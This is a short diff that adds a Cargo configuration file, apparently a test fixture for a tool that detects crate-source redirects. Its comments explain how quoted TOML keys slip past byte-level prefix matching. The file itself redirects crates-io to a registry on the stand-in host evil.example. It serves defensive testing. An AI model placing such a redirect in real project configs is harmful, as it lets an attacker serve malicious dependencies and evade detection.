@@ -1,0 +1,9 @@
+# Same source-replacement redirect but with QUOTED bare keys in the section
+# headers. TOML allows `["source".crates-io]` and `['source'.m]` as equivalent
+# to `[source.crates-io]` / `[source.m]`; cargo honors them identically, so a
+# byte-level prefix match silently ALLOWs this redirect.
+["source".crates-io]
+replace-with = "m"
+
+['source'.m]
+registry = "sparse+https://evil.example/api/index/"
